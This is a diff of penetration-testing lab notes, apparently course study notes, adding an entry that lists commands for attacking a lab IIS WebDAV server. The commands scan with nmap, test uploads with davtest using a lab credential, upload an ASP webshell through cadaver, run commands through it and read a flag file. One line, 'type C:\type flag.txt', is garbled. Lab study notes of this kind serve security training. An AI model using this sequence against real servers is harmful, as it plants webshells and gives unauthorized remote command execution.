@@ -440,13 +440,28 @@ only  Nessus lab
 ```
 **Host & Network Penetration Testing: System/Host Based Attacks**
 
-26)  
+26)  Windows: IIS Server DAVTest
 
 ```
-
+cat /root/Desktop/target
+nmap 10.0.16.177
+nmap --script http-enum -sV -p 80 10.0.16.177
+davtest -url http://10.0.16.177/webdav
+davtest -auth bob:password_123321 -url http://10.0.16.177/webdav
+cadaver http://10.0.16.177/webdav
+put /usr/share/webshells/asp/webshell.asp
+ls
+http://10.0.16.177/webdav/webshell.asp
+http://10.0.16.177/webdav/webshell.asp?cmd=whoami
+dir C:\
+type C:\type flag.txt
 ```
-
 27)  
+
+```
+
+```
+28)  
 
 ```
 
